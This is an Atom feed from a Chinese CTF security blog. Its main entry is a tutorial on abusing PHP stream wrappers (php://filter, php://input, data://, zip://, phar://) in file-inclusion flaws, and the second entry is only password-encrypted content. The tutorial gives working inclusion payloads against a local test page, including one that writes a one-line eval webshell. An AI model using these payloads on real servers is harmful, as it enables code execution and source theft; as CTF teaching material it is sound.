<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MUZI&#39;s BLOG</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2020-07-25T06:33:47.271Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP伪协议总结</title>
    <link href="https://muzibing.github.io/2020/07/25/2020.07.25%EF%BC%88140%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/25/2020.07.25（140）/</id>
    <published>2020-07-24T16:00:00.000Z</published>
    <updated>2020-07-25T06:33:47.271Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-navy0x00-file协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-file协议font"></a> <font color="navy"><code>0x00 file://协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p></li><li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code>会可选地搜索，也作为相对的路径。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:///path/to/file.ext</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p></li></ul><p>      1. <code>file://[文件的绝对路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-1.jpg" alt></p><p>      2. <code>[文件的绝对路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-2.jpg" alt></p><p>      3. <code>[http://网络路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-3.jpg" alt></p><ul><li><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.file.php</a></li></ul><h2 id="font-color-navy0x01-php协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-php协议font"></a> <font color="navy"><code>0x01 php://协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li></ul></li><li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input</code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table></li><li><p><strong><code>php://filter</code>参数详解</strong></p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><table><thead><tr><th>php://filter 参数</th><th>描述</th><th></th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td><td></td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td><td>*）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td><td>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table></li><li><p><strong>可用的过滤器列表（4类）</strong></p><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.php</a></p><p><code>字符串过滤器</code></p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><p><code>转换过滤器</code></p><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><p><code>压缩过滤器</code></p><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><p><code>加密过滤器</code></p><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table></li><li><p><strong>示例</strong>：</p></li></ul><p>      1. <code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><img src="/images/140-4.jpg" alt></p><p>      2.<code>php://input + [POST DATA]</code>执行php代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-5.jpg" alt></p><p>若有写入权限，写入一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&apos;1juhua.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_GET[cmd]); ?&gt;&apos;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-6.jpg" alt></p><ul><li><strong>-参考</strong>：<a href="https://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">https://php.net/manual/zh/wrappers.php.php</a></li></ul><h2 id="font-color-navy0x02-zip-bzip2-zlib-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-zip-bzip2-zlib-协议font"></a> <font color="navy"><code>0x02 zip:// &amp; bzip2:// &amp; zlib:// 协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p></li><li><p><strong>示例</strong>：</p></li></ul><p>      1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）</p><p>      压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-7.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2://file.bz2</span><br></pre></td></tr></table></figure><p>      2.压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure><p><img src="/images/140-8.jpg" alt></p><p>      3.compress.zlib://file.gz</p><p>      压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure><p><img src="/images/140-9.jpg" alt></p><ul><li><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.compression.php</a></li></ul><h2 id="font-color-navy0x03-data-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-data-协议font"></a> <font color="navy"><code>0x03 data:// 协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p></li></ul><p>      1.data://text/plain,`</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-10.jpg" alt></p><p>      2.data://text/plain;base64,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p><img src="/images/140-11.jpg" alt></p><h2 id="font-color-navy0x04-http-https协议-font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-http-https协议-font"></a> <font color="navy"><code>0x04 http:// &amp; https://协议</code> </font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-12.jpg" alt></p></li></ul><h2 id="font-color-navyphar-协议font"><a class="markdownIt-Anchor" href="#font-color-navyphar-协议font"></a> <font color="navy"><code>phar:// 协议</code></font></h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-13.jpg" alt></p><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p><blockquote><p>参考文章：<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-navy0x00-file协议font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-file协议font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF-web 类型题目总结</title>
    <link href="https://muzibing.github.io/2020/07/24/2020.07.24%EF%BC%88139%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/24/2020.07.24（139）/</id>
    <published>2020-07-23T16:00:00.000Z</published>
    <updated>2020-07-25T06:08:47.734Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9f8306a04ac62a4c8c8a36f1fdddc489c085bea765c5e3985ed0f22ee9559b9a">8fcf01f403e36f5188cb69213b24104b53ee2a4271ad3668229832db1fe767f15216e8a07d007d195528a9efd5ac7dd7f7e236f3c6622d24f1dc422d7d87fd8fd9fbf5ca41e50af39e512efc076167c3c455c8df512c229e9e9cc186c940b057226a2dfabcf2db7364a95f2d91bdad146247e11c375c3621983da4929ac852d30cf596e0116512a250d5a0f6f0340868f869df038dfb59d91084cd9425542a826fd0292420cac48c82e3a2f3ea05d77b2814efceaf9aa537d2592b1aff74272f848671813a50afb98b38a69383c259891bf76788d228f46381974252a453a94989b17bdd55f80af47f9cb19914d23886864ce4dd11384d197bf6f32bbdfeae7d69968dad25ae187bc087ffb6139083ac492ac5c52f4bf3f9ddf826ad53a412cc0743a23e4bd28445a32888c187b171f68c6346c4a8fdaf380695e3cc5c0b613d59e6dec89841aba21ed8326dfbbfa62a26ff7b1e9bccdbe1940261b899c21556c21317ed0805de5f02c280d222d0bc047202a60d86ab66c0ca44323bfcc94a97f702b9e1e5364e88eb717de62f12ab25ec037b66e31338398eaf9b4366598db620c327fb10b5f95a4e24943d6530556a073ff0535a9a83446c9eb35f2e4d21622fa818324cd941aae0ec47c3aa0623703615f1e530949a4570341fa458b6f2f07b4568e64169cc1696bbfbe5dc105b29dee66e4329490b015bdeb68f6d09e70abf57b648f100f0c1e1ce261f989504e0e1ecfd13304c15b44efcb1cb4b10ea7737b0ffd16ba5f96de08e656239f60d7dae30ba9e94cb250f0861adb0f069677f5e8dbb16c8cdff259e8be2e28324a66ab715a179892fcdc77ece1c2b27aabbc312619dca208b78890206605b2269fcfac4dd3249b807916b8ef62d05844c94e7f0c9618f6b787f5cf89d6d9919db4427fc04555160e787de6440fd1b7a27ba6ca5fe8d1c3e1c0a496e768176c2f4abb239f036bd6e3c97f258d0986ad5ec4c67e2faa0be132796027294c57f93213e6d7bffc11cafa8aeb7fbf8ab43b22cb685b8fdc0d2686348092f112251beb08c9189485916c8eaa80ed2fbf7f90de650e0e5c2f7d1033ab806cdcb56dd2a8f6606c5d20b4aae910f25a19d905389961c7ff38c8c8dbeba499c4898d4f22cfcce9e16406672d36a697ca672e50f8a6e0ac83e890da511811e1d6bc6830779d15354693b11f02f42200dd7e5c9e0034ec395b8e899ee354132f5818e40f2e11e9d4917998e7d198ba9eac5ec0985d00d1dcb0733bcaf8cb830d81c9bc7ad22958011395dee313ed24a057ab03264d2bcd66a665be959c7fdbe594f8c5a242c0750bc34d343a2f181504f547541cc02471686822e8eeda16a464f74990cfd899283c24fb40ed81c315b45ea80df2b77b379a26353d054955deed500d786d4c74392ce9276029358ad2936b42307e5bd9494e9c2d38c5dcce1de0d47206e44d74c4ecc990b6d7244875b6217ad902d1a1c246ab778ac9ed335ba284e19f1417e770da64e0840ff20953dc8141eba428ca49520cca6c382dd6b415a257818d4184b96437f7f3e2733bc76a3ca1c3842da438f48211e060fbeed48549cdff489d74523ba5266f124c40741c3cbea90134565230baf39ef602a381a04c53615128da40c1b08f96acd12f9d7355bc41eb7bccf25a7aac02053fac33e8ee811306fb50bab6828ceb0b9c0183742b82682dd8cf26e60219bb7c2656ccebd703486c3542238ceb6e3b65d79fdf2ba8970b0e119e9df3eb41241747bf51e725207016b01cb8012839aed4d7f5c76e37b9956d987338be60a41b6b04e16966119af6fda3aa88ecb05b7180682f3cdc505f85d8d11dce321275a69dafed25ba29a88a0b89255781f8512dfb7753b00a6f117da6eb141d0296e7a33d95aca889391e0f09de4de9e608f9f2791f8780c07e190f37624ee50a3b43094b07b7d22c18152f16dbab73cc9c672c391019dfc73a011f1dc189e369adea725817ac1ed58f19bd951d42a668905df78f5cb28875317f0fc5361c0f601a3dde75b93affd8e222bd14ca5ea028e60458f808176c445cce3b16925391c637a7eccc76aa8a4bfb415b12298b87b5bcf49dad98b632aa8c84fd0cce094dc62163be75ca444e844aef791946501915aa5984323be636c1d42c60958b21a58941245a7bd26b049fea599b733e12f5fba98dea80ece97579abea632a96df9596b529fcf31c990a796c62da3fbf14da6e94614fb6003265f0b87061cb8f99c177d47dd75fb5ff99173e88662a6eff84611f8bb8764078386674188c5e479e9b0bbb43b281813f1a317bb10f174401f5ed2528b07b0e80eb4a7a3c6bdac79f55f57f2fa741e67a6921f01e56770204ccad88304ec64b34ed48e623e0376747835bc79dea2298fdfd7b5a19cff2a7b0556fd023a65088a5d8ead7b136408a218a009ab5d19dde7f91a5c17bc4137baeaaaf2548b5ca01c75ca3185d63061c4f52d22fc0edd5e834963990a75a9a4d382c0d6b9bc1c880e2daadfa7c7f92f0578a4c686724a3835aea9876bdd1035dec8543ce3f0a3143ffc24824fb331cb6781f68a779f744e6fe96923c52d82cf1686bfcb275eed9fc06395cf0a4d03cd09878e8cc67dd14f7d178d058abadbaf5b5e6905d2ff810c91b5aad130b0e2b94e44a9d8879e1b5de264ad4b28f447e8cde68e55928ce3c8a5a6ae2cfebdc607eac87377ee08f522491d0f3dabb942bf51c60f7cfcc68f50e1430dd32b9ed2acee1a781c70219e5ce8645156002d56a07f5526b69ff5b8d41e9a0aceaf1f5d90b56f584f9e543af57783cac39ac58cdd0398b68d92104d81d211115275b5c36f8637141c7b865ff6a7e1ca9ce68dfe2a353f6b07910153eb5db68a81b05396e7e12323c97d9813267625aa1897c498452d592f9780958e0192196f3a07c8fd7a08681f31d74760307a2ab4fd5a90567b9a80a2e7a7bd96da94653a7452a5a556983716d1b16265875a6376e05accd0c66720b26d176cb4368ad2af220e3b43d883e19876c296d9fc66da7cdb99f8b506e32dc30bd98228191af8a1edf330fd8ebf46c37e7bc0dc3e2f4fa12715b6b8ee7ee2b0dae553cf94e4cd9e3f08b9ca2d6ac842febac77805ed70fca2ec9ad0c81ba0bfe17ad1dccb07fe9716094ab2a68c10711715000d5f06b0d9b91864a9596b813165b0266d07684826a1fdaf426fd96936b6ceeb16d0734a456a8aad447d04bf2811bc192d5bd813bd75519d57b5a4230e0432286cdf5b891f5d75411d9eb703e5310d19e5ed4a39d3a6eb75cc324d634f94f794c91733bd131e9d93822bad3456c727850d03a99d3689e70d5b8c7ae2b9ab9bd5eb7db833d5c1d55952b1b22b490777b112204cdfdd99e0e875bdb3b78d3a86a42ffb6749070db84750c1640ab4854bc1398a994728e47923a5d355f032e0a96b8c9c55185d18f4eef4da14ee173c38c4c108c8335ccc4b0244ab8c9bba621a7ee4ed86c0f4911eb4f8d17c93d01fcdd62fbe97087a526535264c4e07505c81f2789e2c25f5fdb2d181fadf32be152ff7b5589eafbe40c470a1f06e160609ee41e4e5c012cc06a3dd9d310ccc9b3e3d1641f28b81160f8fb52a923511b249b064a957b6ec7ccd9a8c325566d38b70724a098e1db3180b0b7f779e066a97969447d1c13c17b97e6adb07804df46b9aa4018ec28c33e7c3c40725b874e3cc8c28f2a831c81a7d63372a1f877a1d15ab1d89fcf0153edcbea74fafeeb21d0ca5a6268c36b2fc2756247e9b3c6e7ae39a4285cd08bb7b261ea4c67006137378461d37041315660eac6c09906093d19b89771a811e77e780d1121c02641e183feeed76ea66769ea482e808565d436b185e7ce3e03d58bb3415ea77148e09afb9d7dcb9dec1d248cd7c78495327f080865048a3345f517c9dcba24e9396c55e9e92d29857bceea4d73f8bc9f97d3f3641f49a1d921d1a29d074a7e3e63248e4b4e4ff9d9af504cac4326c9dd8bf093ad100a387a8304d79e3bd936096da4c408cd84398354a7121d8665ab86d3326ddda702003600945d18ed64d401a88627e203b5f199f6abe097cf43a8b0580a1877bd68508658ca5c2e135fcbd1160f463a6e0163bbee0847fbbfbc9b0e248d7a085d52d3b647c09f08c0f84aa4b96b405f14b0ff75980bad4c9397a74b793200562ed2876940239c0e86dd2aa23b1aba45dcd59f60024711e8af0ee62b3c7364f429d38e6a7acfa233c68569954a0d6b94c8cfb672c7b931d6c30896a7f311e6bc26f6b924082074171d374c0d1373c3805296810695739cc2a0f6c402be62659271e3c0004202cd0581fb66536b2f0c4fa6b71dc5d319fc5fe4b315ccad14f7d290bd80df557a67777d213780f49c14ea573d8518db8fc8c4b2a74627aeb78106027d1c3af0b17f6fe4cf17cc8cad5a7b5834d183347ea64ecd16e39e80dc3e72de8634838d3c72e6b87676defb357b3e6321121caf3143859583d80d066162b24e8faf18e1df734a8f3dda05d04193a8c5eecfe4099be38f825275397f4cac787d12858c5559b149aa713fef3e36b3fb91c93013dacd6c98d1bbc60e11fe98b38402773d8bf62e96bf4c7833f2a5abf1160d963e447c6d09adc5ec11ddf654518ca8301b8ebe7bf15554f99e101de680e736add3857ee44d20e295d7c53ffb624e992cf580fa780b800760294b78135b1e9bd2ce683be412a79dd9844da7aaa28d98f3975f217d85c0590b11fec1c2f31bfee0cf1ee9febbb295bcd1a0a23047c3658c03cc8b6cbbf9ea2eb3c7fc521225446da2fad21d95af4a29f9bdd4eae3c3002f5847d28fbf63936c44fcc49a5c0ced7919c94a84aa16eec2407dbbba49b07d803bb534bc29b074ca17852ea7bfb0d0ecd7b2d7d9d9555d801531e4fd75190915228deda81c3e8ff06783941fe36ca547d9eed37a493228f61befc4b270c9fa6f843dcc39755dbc2b4872d8b3847608f90a2ce4758562dd9757aa152149d0f1750820a03bb7553f3426beddc4e31e27f438e6b6c93f80c99b5b04a23353448cefbc4014dbf45b60925c8d3aba7f90df5ca38cf65e6caeedf84414f9d4284089ad3c51055924a633bca76bb7f3f1feb95606dd73813bad98cec627f0e4f5b2642f52f527ce2c05dd34f57ec3d379672fae14f9e532867018c00818d54bfde3e883deb2faca3a63e9fe8f004cf831fa172b0a15eda592302e2a69cdb586ed4ab144d6952e10cc61d7f31b0c65194576671d7979ead4a9108183a6b673186aeff364da5069dfe092c7c89b41133135c27314ee592171589bcb39a30d5e6ec8c7e56da0a7f7f99039ede29ab234a42a1a1e4a335916a3b7464d121dcbc9dcfba3b6ff2b83eda47f38641b3da3786933d2d02ac4ae8f6f3a7dcbeec93b3e051cb47df3558e56183f9fe151eaad5614d4eb65039995404f9709f7d36e7fea1a9d1b7cc0bf82ea91ccfcb922ada15c221a20b0ede1c1a8c2c314590c3017574e80363a1acde494893f283af8daf1f7fd60dcdb5ad23444f4e247197ad663c879ad4d188e47f85a550312457106a8fa635c92d098e3faecffef09562f1acff04de9f1f7565f83ca12b4840b31218bd9f69fc922bee059325e5d74e87f540ea5946ac0ae401210dafe9aa97af49ba7948111c50fbdc5ef5f177eeaf93bad83c5e1223e92a5fd3030cdaed54a13a923d50a7f153caf4f1fb69665e5b949b8913c9d127d6d82412e8eadd6d3121d276d85fbd8632219df8a239ac14a9f241ff3dfe6e9b720ae953fdc0c516422641a1801cb69db72a129912148ff991b3dc2346a4fcbffcf138308d788d6e474daedbf4c9cbf7425c81064f5f30b54c1d0f734117ca2299959e8d72078069547920b9cb9ffcae06a66c859dc20a4b4f4cfd4c1a4c184a12aeed54e3ee4fba5077228d198e2f488cec0f17e244255ac859849dbf57789d7f6941a4752745daa8d34f8cf06224fe1cae341993abc0be11aace4d38c8b6194c1e155ba5a561851c240882c211b226d2a2d0c6615aaa86cf288ac34d6d4e53e103ab48ef7d13bc4eddd67c508c2709ac8d9059d5fca111a7069a64788e18b45af53d83420afd7083fcf282bb0e36357244c87269a02b49e3776ef23995d537d7ecac19f97b2e1c58831574f2006c37693b650b381cc04db6cb2b74be95f862cb82857eb768bbec2ba6cddbc42685a11ab1c06540408b38b3e4547d824c412d54951ddc4b94b704388d5467a9f197a86dc0f6643eb4a7d99d4fb3d81b6c342b28a7f4159a044bec94fb65918dea1ae55e32e6c8c2fc6f714f59fcd6095ed1ce10b59104af1a99ecb112469e23c156012a0ae975ced285e6e71380c2611dd6c875c09cec2477a1236f8c6b1531ad9a331dc706a2ff925950d9b4e52165d28c3a5b3c92dc8d0137d7e880a9f488d26e384f9efcdca8c6728a7bf5cb2ee9b7cfc36f0b29f87f6fe4edbfc15ce5a595012d9b94f0f3dba2cf494c4f6ae438507ada34db91ba4afce4580c577cccae5a84b7f035b1b8a6c292dbd7c702b8935ec0edfc06e72726fc7361b9ab7c357087f34bfb3f530dd608144c7b71a7e4964bd5ff82cfcba2090358326b253c4dd2793637804da6f9c1e1a029587b7a33bfe1661b29bb826b9a87f4d865a2f91808666cbd842083d5d99df3588bda0d84776cc7199fcecbcdade644fa8fb97c191b42a4398c5e9d9a0fe47f8a8d055d3d4b7d406076ec393b69db92a15b83d97d709f6f9413c0f73d3bd83704830d6f1e56d98c1da776ce325a94ba426fe3b4e1505cb449bb0c21f73e77ac64ba135a5754e78321d4a5440e7981c68dc0fa012595900fd3dc4d9516a3b327dcac6b5b0a410f6395f3c1fbf0212b71637390b6410fce3bfc7a43a992c497a22591dbc5af60f2e49766f8ffb897f0465c33b3d41f